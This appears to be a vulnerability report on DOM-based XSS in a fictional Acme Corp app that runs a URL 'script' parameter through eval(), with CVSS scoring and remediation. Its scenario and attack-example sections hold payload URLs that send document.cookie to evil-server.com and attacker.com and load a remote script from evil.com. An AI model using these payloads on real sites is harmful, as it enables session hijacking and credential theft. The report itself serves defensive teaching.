# DOM-Based Cross-Site Scripting via Unsanitized eval() in URL Parameters

# Vulnerability Case
During a review of Acme Corp's client-side JavaScript code for their Single Page Application—built using React and vanilla JavaScript—we discovered a critical flaw involving the use of the `eval()` function. The vulnerability was identified in a dynamic content handler that processes URL query parameters directly without proper sanitization. This allowed for the possibility of executing attacker-controlled code if the evaluated content were manipulated via an external source, such as a maliciously crafted URL. Further testing confirmed that unsanitized user input passed to `eval()` could lead to arbitrary code execution in the browser, potentially compromising session data and enabling further attacks.

```javascript
// Acme Corp's vulnerable dynamic content handler in the SPA
const queryParams = new URLSearchParams(window.location.search);
const dynamicCode = queryParams.get("script");

if (dynamicCode) {
  // Vulnerable: directly evaluates external input without sanitization
  eval(dynamicCode);
}
```

The vulnerability hinges on the direct use of `eval()` with input sourced from the URL query parameter "script". An attacker could craft a URL containing malicious JavaScript payloads, exploiting this behavior to execute arbitrary code in the victim's browser context. Exploitation methods might include DOM manipulation, theft of session cookies, and redirection of users to malicious sites, all of which could lead to broader cross-site scripting (XSS) implications. The business impact is significant: unauthorized access to user data, potential session hijacking, and reputational damage, as well as the risk of financial loss if sensitive transactions are intercepted.


context: javascript.browser.security.eval-detected.eval-detected Detected the use of eval(). eval() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources.

# Vulnerability Breakdown
This vulnerability represents a severe client-side code injection flaw in Acme Corp's Single Page Application, allowing attackers to execute arbitrary JavaScript in users' browsers through URL manipulation.

1. **Key vulnerability elements**:
   - Direct use of the high-risk `eval()` function on unsanitized user input
   - Input sourced directly from URL query parameters (window.location.search)
   - No validation or sanitization before code execution
   - Implementation in a React-based SPA with vanilla JavaScript

2. **Potential attack vectors**:
   - Crafting malicious URLs with JavaScript payloads in the "script" parameter
   - Distributing these URLs through phishing emails, social media, or compromised sites
   - Exploiting URL-shortening services to disguise malicious links
   - Potentially chaining with other vulnerabilities for more severe attacks

3. **Severity assessment**:
   - The vulnerability enables execution of arbitrary JavaScript in the victim's browser context
   - Attackers can access session data, cookies, and local storage
   - Can lead to account takeover if session tokens are accessible
   - Requires victim interaction (clicking a malicious link)
   - Impact limited to the browser context without additional vulnerabilities

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A DOM-based Cross-Site Scripting (XSS) vulnerability has been identified in Acme Corp's Single Page Application built with React and vanilla JavaScript. The vulnerability exists in the dynamic content handler that processes URL query parameters.

The vulnerable code extracts a parameter named "script" from the URL and passes it directly to JavaScript's `eval()` function without any validation or sanitization:

```javascript
const queryParams = new URLSearchParams(window.location.search);
const dynamicCode = queryParams.get("script");

if (dynamicCode) {
  // Vulnerable: directly evaluates external input without sanitization
  eval(dynamicCode);
}

```

This vulnerability allows attackers to craft malicious URLs containing arbitrary JavaScript code that will execute in the victim's browser when they visit the link. The execution occurs in the context of the application, giving the malicious code access to cookies, session tokens, and other sensitive browser data associated with the site. This could lead to session hijacking, credential theft, or other malicious actions performed on behalf of the victim.

# CVSS
**Score**: 5.4 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating is based on several factors in the CVSS 3.1 scoring system:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the internet by crafting a malicious URL, without requiring local network access or physical access.

- **Low Attack Complexity (AC:L)**: Exploiting this vulnerability is straightforward and doesn't require specialized conditions or timing. An attacker simply needs to create a URL with malicious JavaScript in the "script" parameter.

- **No Privileges Required (PR:N)**: The attacker doesn't need any authentication or special privileges to exploit the vulnerability, as the vulnerable code processes URL parameters before any authentication checks.

- **User Interaction Required (UI:R)**: A successful attack requires the victim to interact by clicking a malicious link or visiting a crafted URL. This slightly reduces the severity compared to vulnerabilities that require no user interaction.

- **Unchanged Scope (S:U)**: The vulnerability only impacts resources managed by the same security authority (the user's browser session for that domain).

- **Low Confidentiality Impact (C:L)**: The vulnerability enables access to sensitive browser data such as cookies and session information, but typically doesn't give direct access to server-side information.

- **Low Integrity Impact (I:L)**: The attacker can modify data within the user's browser session, potentially including form fields or displayed content, but typically cannot directly alter server-side data.

- **No Availability Impact (A:N)**: The vulnerability doesn't typically impact the availability of the application itself.

The resulting CVSS score of 5.4 falls within the Medium severity range (4.0-6.9), indicating a significant security issue that should be addressed promptly, though it may not require the same urgency as vulnerabilities with direct server-side impacts or those that require no user interaction.

# Exploitation Scenarios
**Scenario 1: Session Hijacking**
An attacker crafts a malicious URL like: `https://acme-corp.com/app?script=fetch('https://evil-server.com/steal?cookie='+document.cookie)`. The attacker then distributes this link via email, social media, or through a compromised website. When a victim who is already logged into Acme Corp's application clicks the link, their browser executes the injected JavaScript, which sends their session cookies to the attacker's server. The attacker can then use these cookies to impersonate the victim and access their account.

**Scenario 2: Fake Login Form Injection**
An attacker creates a URL with encoded JavaScript that replaces the content of the page with a convincing but fake login form: `https://acme-corp.com/app?script=document.body.innerHTML='<div class="login-form">...fake form HTML...</div>'`. When users enter their credentials, the form submits them to the attacker's server instead of Acme Corp's legitimate authentication endpoint. This attack is particularly effective because the URL in the address bar still shows the legitimate domain, increasing the victim's trust.

**Scenario 3: Persistent Attack via URL Shortener**
The attacker creates a malicious URL with complex JavaScript payload that manipulates the DOM, steals sensitive information, and potentially alters application behavior. To disguise this lengthy URL, they use a URL shortening service to create a short, innocent-looking link. The shortened URL is then shared on forums, social media, or sent directly to potential victims. When users click it, they're directed to Acme Corp's application with the malicious script parameter, executing the attack without the victim being aware of the underlying malicious code.

# Impact Analysis
**Business Impact:**
- Potential unauthorized access to user accounts leading to privacy violations
- Loss of customer trust and brand reputation damage if exploits become public
- Regulatory compliance issues and possible fines if personal data is compromised
- Legal liability for damages resulting from compromised accounts
- Financial losses from fraud if the application processes transactions or payments
- Resources diverted to incident response, customer support, and remediation

**Technical Impact:**
- Unauthorized access to user session data including authentication tokens
- Ability to perform actions on behalf of the victim within the application
- Potential exposure of sensitive information visible in the user interface
- Manipulation of the application's DOM to create misleading content
- Bypassing of client-side security controls
- Potential for more severe attacks if the application has CSRF vulnerabilities
- Risk of localStorage/sessionStorage data theft
- Possible exfiltration of sensitive data entered by users into forms

# Technical Details
The vulnerability is a DOM-based Cross-Site Scripting (XSS) flaw that occurs when the application directly evaluates user-controlled input from URL parameters using JavaScript's `eval()` function.

```javascript
const queryParams = new URLSearchParams(window.location.search);
const dynamicCode = queryParams.get("script");

if (dynamicCode) {
  // Vulnerable: directly evaluates external input without sanitization
  eval(dynamicCode);
}

```

**Vulnerability Mechanics:**

1. The `URLSearchParams` constructor parses the query string from the URL (`window.location.search`)
2. The code extracts the value of the "script" parameter using the `get()` method
3. If the parameter exists, its value is passed directly to `eval()`
4. The `eval()` function dynamically executes the string as JavaScript code in the current context

**Why This Is Dangerous:**

`eval()` is one of the most dangerous JavaScript functions because it executes any string passed to it as code with the full privileges of the calling context. When this string comes from an untrusted source (like URL parameters), it allows attackers to run arbitrary code in the victim's browser.

**Attack Examples:**

1. **Basic payload:** `https://acme-corp.com/app?script=alert(document.cookie)`
   This simply displays the user's cookies, demonstrating code execution.

2. **Data exfiltration:** `https://acme-corp.com/app?script=fetch('https://attacker.com/steal?data='+document.cookie)`
   This sends the victim's cookies to an attacker-controlled server.

3. **Complex attack:**
   ```
   https://acme-corp.com/app?script=var s=document.createElement('script');s.src='https://evil.com/malicious.js';document.body.appendChild(s);
   
```
   This loads a full external malicious script, allowing for more complex attacks.

**Technical Context:**

DOM-based XSS differs from reflected or stored XSS because the vulnerability exists entirely in the client-side code. The malicious payload isn't processed by the server at all - it's directly interpreted by the victim's browser.

In this React-based SPA, this vulnerability likely exists in a component that was intended to support dynamic functionality based on URL parameters, but was implemented unsafely. The core issue is the direct use of `eval()` without sanitizing or validating the input first.

# Remediation Steps
## Remove Use of eval() Function

**Priority**: P0

The most effective remediation is to completely eliminate the use of `eval()` and replace it with safer alternatives:

```javascript
// BEFORE - Vulnerable code
const queryParams = new URLSearchParams(window.location.search);
const dynamicCode = queryParams.get("script");

if (dynamicCode) {
  // Vulnerable: directly evaluates external input without sanitization
  eval(dynamicCode);
}

// AFTER - Remove eval() entirely and use a safer approach
const queryParams = new URLSearchParams(window.location.search);
const actionType = queryParams.get("action");

// Use a whitelist approach for allowed actions
const allowedActions = {
  "showProfile": () => displayUserProfile(),
  "viewSettings": () => navigateToSettings(),
  "loadDashboard": () => loadDashboardData()
};

// Only execute if the action is in our whitelist
if (actionType && allowedActions.hasOwnProperty(actionType)) {
  allowedActions[actionType]();
}

```

This approach eliminates the dangerous `eval()` function entirely and replaces it with a whitelist of predefined actions. Instead of executing arbitrary code, the application only allows specific, predefined functions to be called based on the URL parameter.
## Implement Content Security Policy (CSP)

**Priority**: P1

Implement a strict Content Security Policy as an additional defense layer that can help mitigate XSS attacks, even if similar vulnerabilities are introduced in the future:

```html
<!-- Add this to your HTML <head> section -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; object-src 'none';">

```

Alternatively, configure the CSP through HTTP headers in your server configuration:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

```

This policy restricts the browser to only execute scripts loaded from the same origin as the application, blocking inline scripts and eval() execution. You may need to adjust this policy based on your application's specific requirements (e.g., if you need to load scripts from CDNs).

Note: While CSP is a powerful defense mechanism, it should be considered a complementary measure rather than a replacement for proper input validation and removal of dangerous functions. The primary remediation should still be to eliminate the use of eval() with untrusted input.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-94 | [Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
* CWE-95 | [Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')](https://cwe.mitre.org/data/definitions/95.html)
